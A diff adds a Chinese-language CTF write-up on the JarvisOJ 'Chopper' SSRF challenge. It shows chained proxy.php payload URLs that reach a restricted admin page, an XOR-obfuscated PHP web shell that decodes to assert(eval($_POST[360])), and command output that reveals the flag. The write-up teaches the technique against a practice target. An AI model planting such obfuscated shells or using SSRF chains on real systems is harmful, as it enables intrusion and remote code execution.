@@ -385,3 +385,75 @@ for i in xrange(1000):
         print ret
         break
 ```
+
+### SSRF ###
+
+[例题:JarvisOJ Chopper(ISCC2016)](http://web.jarvisoj.com:32782/)
+
+打开网址，看到菜刀图片和管理员登录，点击管理员登录，显示`you are not admin!`但forbidden页面与以往不同
+
+在 http://web.jarvisoj.com:32782/admin 中查看网页源代码发现hint `<!--<script>alert('admin ip is 202.5.19.128')</script>-->`
+
+尝试对 202.5.19.128 直接访问被拒绝
+
+在 web.jarvisoj.com:32782 中查看源代码发现图片经过了一个proxy.php，尝试对proxy.php访问，显示`invalid request`，猜测通过proxy.php对 202.5.19.128 进行访问
+
+构造payload`http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128`显示 Object not found! 在地址栏中发现http://202.5.19.128转变为http://8080av.com(猫片网站...)
+
+构造payload`http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin/`，与直接点击管理员登录无区别
+
+重新分析题目，猜测是否在proxy.php对202.5.19.128访问后还有一个proxy.php对http://web.jarvisoj.com:32782/admin进行访问
+
+构造payload`http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/`(注意在最后要加上/)
+
+显示`YOU'RE CLOOSING!`，查看源代码无提示，在用御剑扫描后台的同时对常用隐藏hint的地方进行访问，发现`robots.txt`中有内容、
+
+```
+User-agent: *
+Disallow:trojan.php
+Disallow:trojan.php.txt
+```
+
+构造payload`http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php`无显示
+
+构造payload`http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php.txt`显示
+
+```php
+<?php ${("#"^"|").("#"^"|")}=("!"^"`").("( "^"{").("("^"[").("~"^";").("|"^".").("*"^"~");${("#"^"|").("#"^"|")}(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("}"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&"). ("#"^"p"). (">"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?>
+```
+
+在 https://www.runoob.com/try/runcode.php?filename=demo_intro&type=php 中尝试运行，结果为
+
+```
+PHP Notice:  Undefined offset: 360 in /box/main.php(1) : assert code on line 1
+PHP Warning:  assert(): Assertion "eval($_POST[360])" failed in /box/main.php on line 1
+```
+
+向360变量post数据`360=ls`直接得到回显
+
+```
+->|./ 2015-10-11 13:37:08 4096 0755 ../ 2016-01-27 21:41:49 4096 0755 flag:CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs} 2014-09-12 19:37:25 19753 0644 robots.txt 2014-09-12 19:37:25 19753 0644 trojan.php.bak 2014-09-12 19:37:25 19753 0644 trojan.php 2014-09-12 19:37:25 19753 0644 flag.jpg 2014-09-12 19:37:25 19753 0644 |<-
+```
+
+同时猜测360为题目描述中的木马的密码，在菜刀中进行链接，直接显示
+
+```
+HTTP/1.1 200 OK
+Date: Sun, 01 Mar 2020 04:16:36 GMT
+Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3
+X-Powered-By: PHP/5.6.21
+Content-Length: 315
+Content-Type: text/html; charset=UTF-8
+
+
+->|./	2015-10-11 13:37:08	4096	0755
+../	2016-01-27 21:41:49	4096	0755
+flag:CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}	2014-09-12 19:37:25	19753	0644
+robots.txt	2014-09-12 19:37:25	19753	0644
+trojan.php.bak	2014-09-12 19:37:25	19753	0644
+trojan.php	2014-09-12 19:37:25	19753	0644
+flag.jpg	2014-09-12 19:37:25	19753	0644
+|<-
+```
+
+另一种方法可使用file进行任意文件读取[参考文章](https://www.anquanke.com/post/id/154144#h2-3)
